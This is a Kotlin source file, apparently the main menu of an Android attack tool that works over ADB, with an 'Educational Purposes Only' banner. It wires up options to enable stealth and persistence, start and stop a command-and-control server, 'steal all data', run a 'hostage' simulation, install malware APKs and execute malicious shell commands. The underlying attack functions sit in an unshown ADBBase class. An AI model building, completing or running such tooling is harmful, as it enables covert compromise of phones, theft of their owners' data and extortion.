package Src

import Src.ADB.ADBBase
import java.util.Scanner

/**
 * Main function to interact with the ADB interface.
 */
fun main() {
    val adb = ADBBase()
    val scanner = Scanner(System.`in`)

    println("--- ADB Interface (Educational Purposes Only) ---")
    println("Connected to ADB? ${adb.isAdbAccessible()}")
    println("Device Rooted? ${adb.isDeviceRooted()}")
    println()
    println("Available actions:")
    println("1. Visit Opps (Enable stealth, persistent access, start C2)")
    println("2. Steal All Data (to /sdcard/stolen_data)")
    println("3. Dump System Info (to /sdcard/system_info)")
    println("4. Simulate Hostage")
    println("5. Install Malware")
    println("6. Execute Shell Command")
    println("7. List Files")
    println("8. Pull File")
    println("9. Push File")
    println("10. Install APK")
    println("11. Uninstall App")
    println("12. Clear App Data")
    println("13. Reboot Device")
    println("14. Take Screenshot")
    println("15. Get Device Info")
    println("16. Read Logcat")
    println("17. Check Device Status")
    println("18. C2 - Start Server")
    println("19. C2 - Stop Server")
    println("0. Exit")

    while (true) {
        print("Enter action number: ")
        val choice = scanner.nextLine()

        when (choice) {
            "1" -> setupStealthModeAndC2(adb)
            "2" -> stealAllData(adb)
            "3" -> dumpSystemInfo(adb)
            "4" -> simulateHostage(adb)
            "5" -> installMalware(adb, scanner)
            "6" -> executeShellCommand(adb, scanner)
            "7" -> listFiles(adb, scanner)
            "8" -> pullFile(adb, scanner)
            "9" -> pushFile(adb, scanner)
            "10" -> installAPK(adb, scanner)
            "11" -> uninstallApp(adb, scanner)
            "12" -> clearAppData(adb, scanner)
            "13" -> rebootDevice(adb)
            "14" -> takeScreenshot(adb)
            "15" -> getDeviceInfo(adb)
            "16" -> readLogcat(adb)
            "17" -> checkDeviceStatus(adb)
            "18" -> startC2Server(adb)
            "19" -> stopC2Server(adb)
            "0" -> break
            else -> println("Invalid action. Please enter a valid number.")
        }
        println()
    }

    adb.cleanup()
    println("Exiting.")
    scanner.close()
}

fun setupStealthModeAndC2(adb: ADBBase) {
    println("Setting up stealth mode and C2...")
    adb.setupStealthModeAndC2()
    println("Stealth mode and C2 setup initiated.")
}

fun stealAllData(adb: ADBBase) {
    val destination = "/sdcard/stolen_data"
    println("Stealing all accessible data to: $destination")
    adb.exfiltrateData(destination)
    println("Data exfiltration process started (check device for progress).")
}

fun dumpSystemInfo(adb: ADBBase) {
    val destination = "/sdcard/system_info"
    println("Dumping system information to: $destination")
    adb.dumpSystemInfo(destination)
    println("System information dumping initiated (check device for files).")
}

fun simulateHostage(adb: ADBBase) {
    println("Simulating hostage...")
    adb.hostage()
    println("Hostage simulation initiated.")
}

fun installMalware(adb: ADBBase, scanner: Scanner) {
    print("Enter path to APK: ")
    val apkPath = scanner.nextLine()
    if (apkPath.isNotBlank()) {
        println("Installing malware from: $apkPath")
        adb.installMalware(apkPath)
        println("Malware installation initiated.")
    } else {
        println("APK path cannot be empty.")
    }
}

fun executeShellCommand(adb: ADBBase, scanner: Scanner) {
    print("Enter shell command to execute: ")
    val command = scanner.nextLine()
    if (command.isNotBlank()) {
        println("Executing command: $command")
        val result = adb.executeMaliciousCommand(command)
        println("Command execution result:\n$result")
    } else {
        println("Command cannot be empty.")
    }
}

fun listFiles(adb: ADBBase, scanner: Scanner) {
    print("Enter path to list (default: /sdcard): ")
    val path = scanner.nextLine()
    val listPath = if (path.isBlank()) "/sdcard/" else path
    println("Listing files in: $listPath")
    val fileList = adb.listFiles(listPath)
    println(fileList)
}

fun pullFile(adb: ADBBase, scanner: Scanner) {
    print("Enter device path to pull: ")
    val devicePath = scanner.nextLine()
    print("Enter local path to save: ")
    val localPath = scanner.nextLine()
    if (devicePath.isNotBlank() && localPath.isNotBlank()) {
        println("Pulling '$devicePath' to '$localPath'")
        adb.pullFile(devicePath, localPath)
        println("File pull initiated.")
    } else {
        println("Device and local paths cannot be empty.")
    }
}

fun pushFile(adb: ADBBase, scanner: Scanner) {
    print("Enter local path to push: ")
    val localPath = scanner.nextLine()
    print("Enter device path to save to: ")
    val devicePath = scanner.nextLine()
    if (localPath.isNotBlank() && devicePath.isNotBlank()) {
        println("Pushing '$localPath' to '$devicePath'")
        adb.pushFile(localPath, devicePath)
        println("File push initiated.")
    } else {
        println("Local and device paths cannot be empty.")
    }
}

fun installAPK(adb: ADBBase, scanner: Scanner) {
    print("Enter path to APK to install: ")
    val apkPath = scanner.nextLine()
    if (apkPath.isNotBlank()) {
        println("Installing APK from: $apkPath")
        adb.installApk(apkPath)
        println("APK installation initiated.")
    } else {
        println("APK path cannot be empty.")
    }
}

fun uninstallApp(adb: ADBBase, scanner: Scanner) {
    print("Enter package name to uninstall: ")
    val packageName = scanner.nextLine()
    if (packageName.isNotBlank()) {
        println("Uninstalling package: $packageName")
        adb.uninstallApp(packageName)
        println("Uninstall process initiated.")
    } else {
        println("Package name cannot be empty.")
    }
}

fun clearAppData(adb: ADBBase, scanner: Scanner) {
    print("Enter package name to clear data: ")
    val packageName = scanner.nextLine()
    if (packageName.isNotBlank()) {
        println("Clearing data for: $packageName")
        adb.clearAppData(packageName)
        println("Clear data process initiated.")
    } else {
        println("Package name cannot be empty.")
    }
}

fun rebootDevice(adb: ADBBase) {
    println("Rebooting device...")
    adb.rebootDevice()
    println("Reboot command sent.")
}

fun takeScreenshot(adb: ADBBase) {
    val filename = "screenshot.png"
    println("Taking screenshot and saving as $filename")
    adb.takeScreenshot(filename)
    println("Screenshot taken (check device root directory).")
}

fun getDeviceInfo(adb: ADBBase) {
    println("Device Information:")
    println("Model: ${adb.getDeviceModel()}")
    println("Serial: ${adb.getDeviceSerialNumber()}")
    println("Android Version: ${adb.getAndroidVersion()}")
}

fun readLogcat(adb: ADBBase) {
    println("--- Logcat Output ---")
    println(adb.readLogcat())
    println("--- End of Logcat ---")
}

fun checkDeviceStatus(adb: ADBBase) {
    println("--- Device Status ---")
    println("ADB Accessible: ${adb.isAdbAccessible()}")
    println("Rooted: ${adb.isDeviceRooted()}")
    println("--- End of Status ---")
}

fun startC2Server(adb: ADBBase) {
    println("Starting C2 server...")
    adb.startC2Server()
    println("C2 server started.")
}

fun stopC2Server(adb: ADBBase) {
    println("Stopping C2 server...")
    adb.stopC2Server()
    println("C2 server stopped.")
}
